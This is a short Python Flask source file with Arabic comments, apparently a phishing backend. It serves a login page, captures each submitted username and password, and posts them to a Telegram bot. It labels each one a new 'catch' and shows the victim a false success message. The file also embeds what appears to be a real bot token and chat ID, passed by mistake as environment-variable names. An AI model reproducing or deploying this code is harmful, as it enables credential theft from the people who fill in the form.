from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user = request.form.get('username')
        passw = request.form.get('password')
        
        # التبليغ للبوت
        token = os.environ.get('8804114482:AAE8MG5q3DJLQ117Mrl79620Z_FkzKSRBgo')
        chat_id = os.environ.get('6271487398')
        msg = f"🔍 صيدة جديدة!\nUser: {user}\nPass: {passw}"
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={'chat_id': chat_id, 'text': msg})
        
        return "تم تسجيل الدخول بنجاح" # أو توجيه لصفحة ثانية
    return render_template('login.html')
